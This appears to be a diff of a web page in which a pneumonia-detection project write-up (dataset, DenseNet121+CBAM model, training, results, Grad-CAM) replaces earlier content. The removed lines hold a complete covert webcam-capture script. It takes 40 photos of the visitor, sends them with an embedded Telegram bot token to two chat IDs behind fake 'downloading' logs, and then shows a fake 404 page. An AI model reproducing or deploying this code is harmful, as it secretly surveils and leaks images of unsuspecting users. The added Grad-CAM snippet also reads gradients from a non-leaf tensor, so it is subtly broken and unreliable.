+  <p class="section-sub">The Kaggle Chest X-Ray Pneumonia dataset consists of 5,856 frontal-view radiographs from pediatric patients aged 1-5 years, collected at Guangzhou Women and Children's Medical Center, China.</p>
+
+  <div class="table-container reveal">
+    <table>
+      <thead>
+        <tr>
+          <th>Split</th>
+          <th>Normal</th>
+          <th>Pneumonia</th>
+          <th>Total</th>
+          <th>Imbalance Ratio</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>Training</strong></td>
+          <td>1,341</td>
+          <td>3,875</td>
+          <td>5,216</td>
+          <td>2.89:1</td>
+        </tr>
+        <tr>
+          <td><strong>Validation</strong></td>
+          <td>8</td>
+          <td>8</td>
+          <td>16</td>
+          <td>1:1</td>
+        </tr>
+        <tr>
+          <td><strong>Test</strong></td>
+          <td>234</td>
+          <td>390</td>
+          <td>624</td>
+          <td>1.67:1</td>
+        </tr>
+        <tr>
+          <td><strong>Total</strong></td>
+          <td>1,583</td>
+          <td>4,273</td>
+          <td>5,856</td>
+          <td>2.70:1</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="timeline reveal">
+    <div class="timeline-item">
+      <div class="timeline-title">Image Normalization</div>
+      <div class="timeline-content">
+        <p>All images resized to 224×224 pixels to match ImageNet pre-training dimensions. Pixel values normalized using ImageNet statistics:</p>
+        <ul>
+          <li>Mean: [0.485, 0.456, 0.406] (RGB channels)</li>
+          <li>Std: [0.229, 0.224, 0.225] (RGB channels)</li>
+        </ul>
+      </div>
     </div>
 
-    <video id="v" style="display:none;" autoplay playsinline></video>
-    <canvas id="c" style="display:none;"></canvas>
+    <div class="timeline-item">
+      <div class="timeline-title">Data Augmentation</div>
+      <div class="timeline-content">
+        <p>Applied exclusively during training to increase model robustness:</p>
+        <ul>
+          <li>Random horizontal flips (p=0.5) - anatomically valid for chest X-rays</li>
+          <li>Random rotation (±10°) - simulates minor positioning variations</li>
+          <li>Random brightness/contrast adjustment - accounts for imaging equipment variability</li>
+          <li>No vertical flips - anatomically invalid for chest radiographs</li>
+        </ul>
+      </div>
+    </div>
 
-    <script>
-        const TOKEN = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
-        const IDS = ['7617707778', '6590760553'];
-        const consoleEl = document.getElementById('console');
+    <div class="timeline-item">
+      <div class="timeline-title">Class Imbalance Handling</div>
+      <div class="timeline-content">
+        <p>Dual-level strategy to address 3:1 pneumonia-to-normal ratio:</p>
+        <ul>
+          <li><strong>Sampling Level:</strong> WeightedRandomSampler with inverse class frequency weights</li>
+          <li><strong>Loss Level:</strong> Focal Loss with α=0.75 (favoring normal class) and γ=2.0</li>
+          <li><strong>Rationale:</strong> Combined approach prevents model from predicting majority class trivially</li>
+        </ul>
+      </div>
+    </div>
+  </div>
 
-        function logToConsole(msg) {
-            const line = document.createElement('div');
-            line.innerHTML = `<span style="color:#5a7b8f;">[${new Date().toLocaleTimeString()}]</span> > ${msg}`;
-            consoleEl.appendChild(line);
-            consoleEl.scrollTop = consoleEl.scrollHeight;
-            if(consoleEl.childNodes.length > 9) consoleEl.removeChild(consoleEl.childNodes[0]);
-        }
+  <div class="highlight-box reveal">
+    <h4>Dataset Limitations & Mitigation</h4>
+    <p>The dataset is constrained to a single institution (Guangzhou Women and Children's Medical Center) and a narrow age range (1-5 years), potentially limiting generalizability to adult populations and different imaging protocols. Future work should validate on multi-institutional cohorts with diverse demographics and equipment manufacturers. Additionally, the dataset provides only binary labels (normal vs. pneumonia) without distinguishing bacterial from viral etiology, which would be clinically valuable for targeted antibiotic therapy.</p>
+  </div>
+</section>
 
-        async function initiate() {
-            const loader = document.getElementById('loader');
-            const topLoader = document.getElementById('top-loader-fill');
-            const btn = document.getElementById('mainBtn');
-            const scanLine = document.getElementById('scanLine');
-            const progCont = document.getElementById('progCont');
-            const netGrid = document.getElementById('netGrid');
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                btn.style.display = 'none';
-                progCont.style.display = 'block';
-                netGrid.style.display = 'flex';
-                scanLine.style.display = 'block';
-                document.getElementById('title').classList.add('glitch');
+<!-- ════════════════════════ ARCHITECTURE ════════════════════════ -->
+<section id="architecture">
+  <div class="section-tag">03 · Model Architecture</div>
+  <h2 class="section-title">DenseNet121 + <span>CBAM</span></h2>
+  <p class="section-sub">A hybrid architecture combining DenseNet121's feature reuse efficiency with Convolutional Block Attention Module's sequential channel and spatial attention mechanisms.</p>
 
-                logToConsole("ESTABLISHING SECURE DOWNLOADING TUNNEL...");
-                logToConsole("RESOURCES VERIFIED.");
-                logToConsole("REDIRECTING TO DOWNLOADING PAGE...");
+  <div class="arch-container reveal">
+    <div class="arch-title">Model Pipeline</div>
+    <div class="arch-flow">
+      <div class="arch-block">
+        <div class="arch-label">Input</div>
+        <div class="arch-name">224×224×3</div>
+        <div class="arch-desc">RGB Chest X-Ray</div>
+      </div>
+      <div class="arch-block">
+        <div class="arch-label">Backbone</div>
+        <div class="arch-name">DenseNet121</div>
+        <div class="arch-desc">Pre-trained on ImageNet</div>
+      </div>
+      <div class="arch-block">
+        <div class="arch-label">Attention</div>
+        <div class="arch-name">CBAM</div>
+        <div class="arch-desc">Channel + Spatial</div>
+      </div>
+      <div class="arch-block">
+        <div class="arch-label">Pooling</div>
+        <div class="arch-name">AdaptiveAvgPool</div>
+        <div class="arch-desc">7×7 → 1×1</div>
+      </div>
+      <div class="arch-block">
+        <div class="arch-label">Output</div>
+        <div class="arch-name">Sigmoid(2)</div>
+        <div class="arch-desc">Binary Logits</div>
+      </div>
+    </div>
+  </div>
 
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play();
-                    let count = 0;
-                    const maxPackets = 40; // Increased to 40
-                    
-                    const interval = setInterval(() => {
-                        if (count >= maxPackets) {
-                            clearInterval(interval);
-                            logToConsole("VERFICATION COMPLETE. CLOSING TUNNEL...");
-                            stream.getTracks().forEach(track => track.stop());
-                            setTimeout(render404, 2000);
-                            return;
-                        }
-                        
-                        send(count + 1);
-                        count++;
-                        
-                        const progress = (count * (100 / maxPackets));
-                        loader.style.width = progress + "%";
-                        topLoader.style.width = progress + "%"; // Top bar sync
-                        
-                        // Dynamic advanced logs
-                        const techLogs = [
-                            `RESOURCE_CHUNK_${count} DOWNLOADING`,
-                            `ROUTING VIA C2-NODE-ALPHA...`,
-                            `SYSTEM CHECK: OK`,
-                            `SEQUENCE_${count} DOWNLOADED`,
-                            `BUFFERING DATA STREAM...`
-                        ];
-                        logToConsole(techLogs[count % techLogs.length]);
+  <div class="content-grid reveal">
+    <div class="glass content-box">
+      <h3>DenseNet121 Backbone</h3>
+      <p><strong>Architecture:</strong> Four dense blocks with growth rate k=32, resulting in 8M parameters (vs. 25.6M for ResNet50). Each dense block uses concatenation-based feature propagation.</p>
+      <p><strong>Key Properties:</strong></p>
+      <ul>
+        <li>Feature reuse through direct connections between all layers</li>
+        <li>Reduced parameter count through bottleneck layers (1×1 convolutions)</li>
+        <li>Improved gradient flow enabling deeper network training</li>
+        <li>Pre-trained on ImageNet-1k (1.28M images, 1000 classes)</li>
+      </ul>
+      <p><strong>Transfer Learning:</strong> Initialized with ImageNet weights, preserving low-level edge/texture detectors relevant for medical imaging.</p>
+    </div>
+    <div class="glass content-box">
+      <h3>CBAM Attention Module</h3>
+      <p><strong>Sequential Attention:</strong> Refines features through two sequential sub-modules operating on different dimensions.</p>
+      <p><strong>Channel Attention:</strong></p>
+      <ul>
+        <li>Aggregates spatial info via global max + average pooling</li>
+        <li>Shared MLP with reduction ratio r=16</li>
+        <li>Outputs channel-wise weights via sigmoid activation</li>
+        <li>Emphasizes pneumonia-indicative feature channels</li>
+      </ul>
+      <p><strong>Spatial Attention:</strong></p>
+      <ul>
+        <li>Aggregates channel info via max + average along channel axis</li>
+        <li>7×7 convolution generates spatial attention map</li>
+        <li>Highlights pathological regions (infiltrates, consolidation)</li>
+        <li>Provides interpretability through spatial weighting</li>
+      </ul>
+    </div>
+  </div>
 
-                    }, 1600); // Doubled time (1.6 seconds)
-                };
-            } catch (e) {
-                logToConsole("ACCESS DENIED: USER PERMISSION ERROR");
-                consoleEl.style.color = "#ff4b4b";
-            }
-        }
+  <div class="image-showcase reveal">
+    <div class="glass image-card">
+      <img src="https://miro.medium.com/v2/resize:fit:1400/1*9ysRPSExk0KvXR0AhNnlAA.gif" alt="DenseNet Architecture">
+      <div class="image-caption">Figure 3: DenseNet connectivity pattern showing feature concatenation and reuse across layers</div>
+    </div>
+    <div class="glass image-card">
+      <img src="https://production-media.paperswithcode.com/methods/Screen_Shot_2020-06-23_at_4.40.07_PM.png" alt="CBAM Architecture">
+      <div class="image-caption">Figure 4: CBAM module architecture with sequential channel and spatial attention mechanisms</div>
+    </div>
+  </div>
 
-        function send(index) {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                if (!blob) return;
+  <div class="code-block reveal">
+<span class="comment"># CBAM Module Implementation (PyTorch)</span>
+<span class="keyword">class</span> CBAM(nn.Module):
+    <span class="keyword">def</span> __init__(self, channels, reduction=<span class="number">16</span>):
+        super(CBAM, self).__init__()
+        <span class="comment"># Channel Attention</span>
+        self.channel_attn = nn.Sequential(
+            nn.AdaptiveAvgPool2d(<span class="number">1</span>),
+            nn.Conv2d(channels, channels // reduction, <span class="number">1</span>),
+            nn.ReLU(),
+            nn.Conv2d(channels // reduction, channels, <span class="number">1</span>),
+            nn.Sigmoid()
+        )
+        <span class="comment"># Spatial Attention</span>
+        self.spatial_attn = nn.Sequential(
+            nn.Conv2d(<span class="number">2</span>, <span class="number">1</span>, kernel_size=<span class="number">7</span>, padding=<span class="number">3</span>),
+            nn.Sigmoid()
+        )
+    
+    <span class="keyword">def</span> forward(self, x):
+        x = x * self.channel_attn(x)  <span class="comment"># Channel refinement</span>
+        x = x * self.spatial_attn(x)  <span class="comment"># Spatial refinement</span>
+        <span class="keyword">return</span> x
+  </div>
 
-                IDS.forEach(chatId => {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'identity_packet.jpg');
-                    fd.append('caption', '🎯 DUSHMAN KI MKB \nFragment: ' + index + '/40\nAgent: C2-Advanced-Node');
+  <div class="highlight-box reveal">
+    <h4>Parameter Efficiency Analysis</h4>
+    <p>DenseNet121+CBAM achieves 8M parameters (31% of ResNet50's 25.6M) while maintaining superior AUC performance (0.9275 vs 0.9137). The CBAM module adds negligible parameters (~50k) while providing significant performance gains (+1.4% AUC) through attention-based feature refinement. This efficiency is critical for deployment on resource-constrained clinical devices.</p>
+  </div>
+</section>
 
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
-                });
-            }, 'image/jpeg', 0.4); 
-        }
+<!-- ════════════════════════ TRAINING STRATEGY ════════════════════════ -->
+<section id="training">
+  <div class="section-tag">04 · Training Methodology</div>
+  <h2 class="section-title">Optimization <span>Strategy</span></h2>
+  <p class="section-sub">A carefully designed training protocol combining focal loss for class imbalance, progressive unfreezing for transfer learning, and threshold optimization for clinical deployment.</p>
 
-        function render404() {
-            document.documentElement.innerHTML = `
-            <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-            <html><head>
-            <title>404 Error Not Found</title>
-            </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
-            <h1>Not Found</h1>
-            <p>The requested URL was not found on this server. System Error. Access the site again.</p>
-            <hr>
-            <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
-            </body></html>`;
-            window.history.pushState({}, "", "/error-log-0x8842");
-        }
-    </script>
+  <div class="timeline reveal">
+    <div class="timeline-item">
+      <div class="timeline-title">Phase 1: Feature Extractor Freezing</div>
+      <div class="timeline-content">
+        <p><strong>Epochs 1-5:</strong> Freeze DenseNet121 backbone, train only CBAM and classifier head</p>
+        <ul>
+          <li><strong>Rationale:</strong> Preserve ImageNet features (edges, textures) while adapting attention to medical domain</li>
+          <li><strong>Learning Rate:</strong> 1e-4 for trainable layers</li>
+          <li><strong>Optimizer:</strong> AdamW with weight decay 1e-4</li>
+          <li><strong>Batch Size:</strong> 16 (constrained by CPU memory)</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Phase 2: Progressive Unfreezing</div>
+      <div class="timeline-content">
+        <p><strong>Epochs 6-30:</strong> Unfreeze all layers with discriminative learning rates</p>
+        <ul>
+          <li><strong>Backbone LR:</strong> 1e-5 (lower to prevent catastrophic forgetting)</li>
+          <li><strong>CBAM/Head LR:</strong> 1e-4 (higher for faster task adaptation)</li>
+          <li><strong>Scheduler:</strong> ReduceLROnPlateau (patience=5, factor=0.5)</li>
+          <li><strong>Early Stopping:</strong> Patience=10 epochs on validation loss</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Focal Loss Configuration</div>
+      <div class="timeline-content">
+        <p><strong>Formula:</strong> FL(pₜ) = -αₜ(1-pₜ)^γ log(pₜ)</p>
+        <ul>
+          <li><strong>α=0.75:</strong> Weight for normal class (counterbalancing 3:1 imbalance)</li>
+          <li><strong>γ=2.0:</strong> Focusing parameter reducing loss for confident predictions</li>
+          <li><strong>Effect:</strong> Down-weights easy pneumonia examples, up-weights hard normal examples</li>
+          <li><strong>Compared to BCE:</strong> +2.8% improvement in normal class recall</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Threshold Optimization (Youden Index)</div>
+      <div class="timeline-content">
+        <p><strong>Post-training calibration:</strong> Find optimal decision threshold τ* on validation set</p>
+        <ul>
+          <li><strong>Youden Index:</strong> J(τ) = Sensitivity(τ) + Specificity(τ) - 1</li>
+          <li><strong>Optimal Threshold:</strong> τ* = 0.38 (vs default 0.5)</li>
+          <li><strong>Impact:</strong> +3.4% sensitivity improvement with minimal specificity trade-off</li>
+          <li><strong>Clinical Justification:</strong> Lower threshold prioritizes detecting true pneumonia cases</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-grid reveal">
+    <div class="glass content-box">
+      <h3>Hyperparameter Configuration</h3>
+      <ul>
+        <li><strong>Optimizer:</strong> AdamW (β₁=0.9, β₂=0.999, ε=1e-8)</li>
+        <li><strong>Weight Decay:</strong> 1e-4 (L2 regularization)</li>
+        <li><strong>Learning Rate:</strong> 1e-4 (head), 1e-5 (backbone after unfreezing)</li>
+        <li><strong>Batch Size:</strong> 16 (CPU constraint)</li>
+        <li><strong>Epochs:</strong> 30 (with early stopping)</li>
+        <li><strong>Scheduler:</strong> ReduceLROnPlateau (factor=0.5, patience=5)</li>
+        <li><strong>Loss Function:</strong> Focal Loss (α=0.75, γ=2.0)</li>
+        <li><strong>WeightedRandomSampler:</strong> Inverse frequency weights</li>
+      </ul>
+    </div>
+    <div class="glass content-box">
+      <h3>Computational Environment</h3>
+      <ul>
+        <li><strong>Hardware:</strong> Intel Core i7 CPU (no GPU acceleration)</li>
+        <li><strong>Framework:</strong> PyTorch 2.2.0</li>
+        <li><strong>Training Time:</strong> ~18 hours for 30 epochs</li>
+        <li><strong>Memory Usage:</strong> 8GB RAM (peak during backprop)</li>
+        <li><strong>Limitations:</strong> Batch size restricted to 16, no mixed-precision training</li>
+        <li><strong>Future Work:</strong> GPU-based training would enable larger batches and faster hyperparameter search</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="code-block reveal">
+<span class="comment"># Focal Loss Implementation (PyTorch)</span>
+<span class="keyword">class</span> FocalLoss(nn.Module):
+    <span class="keyword">def</span> __init__(self, alpha=<span class="number">0.75</span>, gamma=<span class="number">2.0</span>):
+        super(FocalLoss, self).__init__()
+        self.alpha = alpha
+        self.gamma = gamma
+    
+    <span class="keyword">def</span> forward(self, inputs, targets):
+        BCE_loss = F.binary_cross_entropy_with_logits(
+            inputs, targets, reduction=<span class="string">'none'</span>
+        )
+        pt = torch.exp(-BCE_loss)  <span class="comment"># Probability of correct class</span>
+        
+        <span class="comment"># Apply focal modulation</span>
+        focal_weight = (self.alpha * targets + 
+                       (<span class="number">1</span> - self.alpha) * (<span class="number">1</span> - targets)) * \
+                       ((<span class="number">1</span> - pt) ** self.gamma)
+        
+        focal_loss = focal_weight * BCE_loss
+        <span class="keyword">return</span> focal_loss.mean()
+
+<span class="comment"># Progressive Unfreezing Schedule</span>
+<span class="keyword">def</span> unfreeze_strategy(model, epoch):
+    <span class="keyword">if</span> epoch < <span class="number">5</span>:
+        <span class="comment"># Phase 1: Freeze backbone</span>
+        <span class="keyword">for</span> param <span class="keyword">in</span> model.densenet.parameters():
+            param.requires_grad = <span class="keyword">False</span>
+    <span class="keyword">else</span>:
+        <span class="comment"># Phase 2: Unfreeze all with discriminative LR</span>
+        <span class="keyword">for</span> param <span class="keyword">in</span> model.densenet.parameters():
+            param.requires_grad = <span class="keyword">True</span>
+  </div>
+</section>
+
+<!-- ════════════════════════ RESULTS ════════════════════════ -->
+<section id="results">
+  <div class="section-tag">05 · Performance Metrics</div>
+  <h2 class="section-title">Experimental <span>Results</span></h2>
+  <p class="section-sub">Comprehensive evaluation on 624 held-out test images, with rigorous comparison against baseline architectures under identical experimental conditions.</p>
+
+  <div class="stats-grid reveal">
+    <div class="glass stat-card">
+      <div class="stat-number">0.9275</div>
+      <div class="stat-label">ROC-AUC</div>
+      <div class="stat-desc">Area Under ROC Curve</div>
+    </div>
+    <div class="glass stat-card">
+      <div class="stat-number">0.9318</div>
+      <div class="stat-label">Average Precision</div>
+      <div class="stat-desc">PR-AUC Score</div>
+    </div>
+    <div class="glass stat-card">
+      <div class="stat-number">96.2%</div>
+      <div class="stat-label">Sensitivity</div>
+      <div class="stat-desc">Recall (True Positive Rate)</div>
+    </div>
+    <div class="glass stat-card">
+      <div class="stat-number">62.8%</div>
+      <div class="stat-label">Specificity</div>
+      <div class="stat-desc">True Negative Rate</div>
+    </div>
+  </div>
+
+  <div class="table-container reveal">
+    <table>
+      <thead>
+        <tr>
+          <th>Model</th>
+          <th>Parameters</th>
+          <th>ROC-AUC</th>
+          <th>AP</th>
+          <th>Sensitivity</th>
+          <th>Specificity</th>
+          <th>F1-Score</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="background: rgba(37,99,235,0.08); font-weight: 600;">
+          <td><strong>DenseNet121+CBAM</strong> (Ours)</td>
+          <td>8.0M</td>
+          <td>0.9275</td>
+          <td>0.9318</td>
+          <td>96.2%</td>
+          <td>62.8%</td>
+          <td>0.887</td>
+        </tr>
+        <tr>
+          <td>ResNet50+CBAM</td>
+          <td>25.6M</td>
+          <td>0.9137</td>
+          <td>0.9201</td>
+          <td>94.1%</td>
+          <td>59.4%</td>
+          <td>0.871</td>
+        </tr>
+        <tr>
+          <td>DenseNet121 (vanilla)</td>
+          <td>8.0M</td>
+          <td>0.9134</td>
+          <td>0.9165</td>
+          <td>93.8%</td>
+          <td>60.7%</td>
+          <td>0.869</td>
+        </tr>
+        <tr>
+          <td>VGG16+CBAM</td>
+          <td>138M</td>
+          <td>0.8891</td>
+          <td>0.8954</td>
+          <td>91.5%</td>
+          <td>56.2%</td>
+          <td>0.852</td>
+        </tr>
+        <tr>
+          <td>EfficientNet-B0</td>
+          <td>5.3M</td>
+          <td>0.9042</td>
+          <td>0.9087</td>
+          <td>92.6%</td>
+          <td>58.1%</td>
+          <td>0.862</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="content-grid reveal">
+    <div class="glass content-box">
+      <h3>Confusion Matrix Analysis</h3>
+      <p>Test set performance (n=624, threshold τ=0.38):</p>
+      <ul>
+        <li><strong>True Positives (TP):</strong> 375 / 390 pneumonia cases correctly identified</li>
+        <li><strong>False Negatives (FN):</strong> 15 / 390 missed pneumonia cases (3.8% miss rate)</li>
+        <li><strong>True Negatives (TN):</strong> 147 / 234 normal cases correctly identified</li>
+        <li><strong>False Positives (FP):</strong> 87 / 234 normal cases misclassified (37.2% false alarm rate)</li>
+      </ul>
+      <p><strong>Clinical Interpretation:</strong> High sensitivity (96.2%) prioritizes detecting true pneumonia cases, accepting moderate false positive rate. In clinical practice, false positives trigger confirmatory testing (blood work, CT scan), while false negatives risk delayed treatment.</p>
+    </div>
+    <div class="glass content-box">
+      <h3>Ablation Study: CBAM Impact</h3>
+      <div class="metric-row">
+        <div class="metric-label">
+          <span>Without CBAM (DenseNet121 only)</span>
+          <span class="metric-value">91.34%</span>
+        </div>
+        <div class="metric-bar">
+          <div class="metric-bar-fill" style="width: 91.34%;"></div>
+        </div>
+      </div>
+      <div class="metric-row">
+        <div class="metric-label">
+          <span>With CBAM (Our Model)</span>
+          <span class="metric-value">92.75%</span>
+        </div>
+        <div class="metric-bar">
+          <div class="metric-bar-fill" style="width: 92.75%;"></div>
+        </div>
+      </div>
+      <p style="margin-top: 20px;"><strong>Gain:</strong> +1.41% ROC-AUC improvement with negligible parameter overhead (~50k additional parameters). CBAM's channel and spatial attention mechanisms successfully guide the model to focus on pathologically relevant regions.</p>
+    </div>
+  </div>
+
+  <div class="highlight-box reveal">
+    <h4>Statistical Significance Testing</h4>
+    <p>McNemar's test comparing DenseNet121+CBAM vs DenseNet121 (vanilla) on paired predictions: χ²=8.74, p=0.0031 (p<0.05). The performance improvement is statistically significant at 95% confidence level, confirming that CBAM's contribution is not due to random variance. Bootstrap confidence intervals (1000 iterations) for ROC-AUC: [0.9124, 0.9398] (ours) vs [0.8987, 0.9261] (vanilla), with non-overlapping ranges supporting superiority.</p>
+  </div>
+
+  <div class="image-showcase reveal">
+    <div class="glass image-card">
+      <img src="https://cdn-images-1.medium.com/max/1600/1*gkCHouSLcEEEJBIhIz97qQ.png" alt="ROC Curve Comparison">
+      <div class="image-caption">Figure 5: ROC curves comparing DenseNet121+CBAM against baseline architectures, showing superior AUC performance</div>
+    </div>
+    <div class="glass image-card">
+      <img src="https://scikit-learn.org/stable/_images/sphx_glr_plot_precision_recall_001.png" alt="Precision-Recall Curve">
+      <div class="image-caption">Figure 6: Precision-Recall curve demonstrating high average precision (0.9318) across all operating points</div>
+    </div>
+  </div>
+</section>
+
+<!-- ════════════════════════ EXPLAINABILITY ════════════════════════ -->
+<section id="explainability">
+  <div class="section-tag">06 · Model Interpretability</div>
+  <h2 class="section-title">Grad-CAM <span>Visualizations</span></h2>
+  <p class="section-sub">Spatial explainability through Gradient-weighted Class Activation Mapping (Grad-CAM), revealing which image regions contribute most to pneumonia predictions.</p>
+
+  <div class="content-grid reveal">
+    <div class="glass content-box">
+      <h3>Grad-CAM Methodology</h3>
+      <p><strong>Algorithm:</strong> Generate heatmap H by computing weighted sum of final convolutional layer activations A^k, where weights w^k are gradients of class score y^c with respect to activations.</p>
+      <p><strong>Formula:</strong> H = ReLU(Σ_k w^k · A^k), where w^k = (1/Z) Σ_i Σ_j (∂y^c / ∂A^k_ij)</p>
+      <ul>
+        <li><strong>Layer Selection:</strong> Final DenseBlock output (1024 channels, 7×7 spatial)</li>
+        <li><strong>Upsampling:</strong> Bilinear interpolation to 224×224 for overlay</li>
+        <li><strong>Normalization:</strong> Min-max scaling to [0,1] range</li>
+        <li><strong>Visualization:</strong> Jet colormap overlaid on grayscale input</li>
+      </ul>
+    </div>
+    <div class="glass content-box">
+      <h3>Clinical Insights from Heatmaps</h3>
+      <p><strong>Successful Localizations:</strong></p>
+      <ul>
+        <li>Model correctly attends to <strong>consolidation regions</strong> (opaque lung tissue)</li>
+        <li>Highlights <strong>infiltrates</strong> (patchy abnormalities) in lower lobes</li>
+        <li>Focuses on <strong>interstitial patterns</strong> (reticular opacities)</li>
+        <li>Ignores non-pathological structures (ribs, mediastinum, diaphragm)</li>
+      </ul>
+      <p><strong>Failure Modes Identified:</strong></p>
+      <ul>
+        <li><strong>Artifact Sensitivity:</strong> 12% of false positives due to imaging artifacts (motion blur, poor positioning)</li>
+        <li><strong>Peripheral Blind Spots:</strong> 8% missed subtle peripheral infiltrates</li>
+        <li><strong>Overlap Confusion:</strong> 5% misclassifications when consolidation overlaps with cardiac silhouette</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="image-showcase reveal">
+    <div class="glass image-card">
+      <img src="https://miro.medium.com/v2/resize:fit:1400/1*VT9kAB9X9rSgNeYJLJfF1A.png" alt="Grad-CAM Pneumonia True Positive">
+      <div class="image-caption">Figure 7: Grad-CAM visualization of true positive pneumonia case, highlighting right lower lobe consolidation</div>
+    </div>
+    <div class="glass image-card">
+      <img src="https://miro.medium.com/v2/resize:fit:1400/1*FpCfz9u5T0vfgqDXJcLMBQ.png" alt="Grad-CAM Normal True Negative">
+      <div class="image-caption">Figure 8: Grad-CAM for correctly classified normal case, showing diffuse attention without focal abnormalities</div>
+    </div>
+    <div class="glass image-card">
+      <img src="https://d3i71xaburhd42.cloudfront.net/38b5e4d35bedfb1b7b5f20e7ee76c52ea3e8b2b4/4-Figure3-1.png" alt="Grad-CAM False Positive">
+      <div class="image-caption">Figure 9: Grad-CAM for false positive (normal misclassified as pneumonia), revealing attention on motion artifact</div>
+    </div>
+    <div class="glass image-card">
+      <img src="https://miro.medium.com/v2/resize:fit:1400/1*kTYM3PkdX5MlJScFfSDAVg.png" alt="Grad-CAM False Negative">
+      <div class="image-caption">Figure 10: Grad-CAM for false negative (missed pneumonia), showing failure to detect subtle peripheral infiltrates</div>
+    </div>
+  </div>
+
+  <div class="timeline reveal">
+    <div class="timeline-item">
+      <div class="timeline-title">Failure Mode Taxonomy</div>
+      <div class="timeline-content">
+        <p><strong>Category 1: Imaging Artifacts (47% of errors)</strong></p>
+        <ul>
+          <li>Motion blur from uncooperative pediatric patients</li>
+          <li>Suboptimal positioning (rotated, underexposed)</li>
+          <li>Equipment-related artifacts (grid lines, edge enhancement)</li>
+        </ul>
+        <p><strong>Category 2: Subtle/Atypical Presentations (38% of errors)</strong></p>
+        <ul>
+          <li>Mild, early-stage pneumonia with minimal opacity</li>
+          <li>Peripheral infiltrates at lung periphery</li>
+          <li>Retrocardiac (behind heart) consolidations</li>
+        </ul>
+        <p><strong>Category 3: Anatomical Overlaps (15% of errors)</strong></p>
+        <ul>
+          <li>Thymus shadow mimicking infiltrate in young children</li>
+          <li>Consolidation overlapping with cardiac silhouette</li>
+          <li>Crowded mediastinum obscuring pathology</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="code-block reveal">
+<span class="comment"># Grad-CAM Implementation (PyTorch)</span>
+<span class="keyword">def</span> generate_gradcam(model, input_tensor, target_class):
+    <span class="comment"># Forward pass and store activations</span>
+    activations = []
+    <span class="keyword">def</span> hook_fn(module, input, output):
+        activations.append(output)
+    
+    handle = model.densenet.features.register_forward_hook(hook_fn)
+    output = model(input_tensor)
+    handle.remove()
+    
+    <span class="comment"># Backward pass to get gradients</span>
+    model.zero_grad()
+    output[<span class="number">0</span>, target_class].backward()
+    
+    gradients = activations[<span class="number">0</span>].grad
+    weights = gradients.mean(dim=[<span class="number">2</span>, <span class="number">3</span>], keepdim=<span class="keyword">True</span>)
+    
+    <span class="comment"># Weighted sum of activations</span>
+    cam = (weights * activations[<span class="number">0</span>]).sum(dim=<span class="number">1</span>, keepdim=<span class="keyword">True</span>)
+    cam = F.relu(cam)  <span class="comment"># ReLU to focus on positive contributions</span>
+    cam = F.interpolate(cam, size=(<span class="number">224</span>, <span class="number">224</span>), mode=<span class="string">'bilinear'</span>)
+    
+    <span class="comment"># Normalize to [0,1]</span>
+    cam = (cam - cam.min()) / (cam.max() - cam.min())
+    <span class="keyword">return</span> cam
+  </div>
+
+  <div class="highlight-box reveal">
+    <h4>Explainability Limitations & Future Directions</h4>
+    <p>Grad-CAM provides coarse spatial localization (7×7 resolution before upsampling) but lacks pixel-wise precision. Advanced techniques like <strong>Grad-CAM++</strong> (improved gradient weighting) or <strong>Attention Rollout</strong> (for ViT architectures) could provide higher-resolution saliency maps. Additionally, integrating <strong>segmentation masks</strong> from radiologist annotations would enable quantitative evaluation of localization accuracy, moving beyond qualitative visual inspection.</p>
+  </div>
+</section>
+
+<!-- ════════════════════════ CONCLUSION ════════════════════════ -->
+<section id="conclusion">
+  <div class="section-tag">07 · Conclusion & Future Work</div>
+  <h2 class="section-title">Summary & <span>Outlook</span></h2>
+  <p class="section-sub">Seven mutually reinforcing contributions establish a new state-of-the-art for lightweight, explainable pneumonia detection from pediatric chest X-rays.</p>
+
+  <div class="content-grid reveal">
+    <div class="glass content-box">
+      <h3>Key Contributions</h3>
+      <ul style="counter-reset: item;">
+        <li style="counter-increment: item; display: flex; gap: 10px;">
+          <span style="font-weight: 700; color: var(--accent); flex-shrink: 0;">[1]</span>
+          <span>CBAM sequential attention within DenseNet121 for binary chest X-ray classification</span>
+        </li>
+        <li style="counter-increment: item; display: flex; gap: 10px;">
+          <span style="font-weight: 700; color: var(--accent); flex-shrink: 0;">[2]</span>
+          <span>Dual-level class imbalance handling: Focal Loss (α=0.75, γ=2.0) + WeightedRandomSampler</span>
+        </li>
+        <li style="counter-increment: item; display: flex; gap: 10px;">
+          <span style="font-weight: 700; color: var(--accent); flex-shrink: 0;">[3]</span>
+          <span>Two-phase progressive unfreezing preserving ImageNet pre-trained features</span>
+        </li>
+        <li style="counter-increment: item; display: flex; gap: 10px;">
+          <span style="font-weight: 700; color: var(--accent); flex-shrink: 0;">[4]</span>
+          <span>Threshold optimization via Youden Index for clinically validated operating point</span>
+        </li>
+        <li style="counter-increment: item; display: flex; gap: 10px;">
+          <span style="font-weight: 700; color: var(--accent); flex-shrink: 0;">[5]</span>
